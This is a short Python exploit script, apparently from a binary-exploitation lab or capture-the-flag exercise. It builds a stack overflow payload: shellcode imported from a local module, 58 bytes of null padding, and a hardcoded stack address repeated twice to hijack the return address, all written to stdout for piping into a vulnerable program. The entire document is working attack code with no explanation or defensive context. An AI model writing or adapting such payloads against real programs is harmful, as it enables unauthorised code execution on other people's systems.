#!/usr/bin/env python3

import sys

from shellcode import shellcode

# Calculate the offset

offset = b'\x00'*58
offset+= b'\xa0\x86\xf6\xff\xff\x7f\x00\x00'
offset+= b'\xa0\x86\xf6\xff\xff\x7f\x00\x00'
#\x7f\xff\xff\xf6\x86\xa0
#\xa0\x86\xf6\xff\xff\x7f

#0x7ffffff686a0
#0x7ffffff686d6

# Write the payload to stdout buffer
sys.stdout.buffer.write(shellcode+offset)
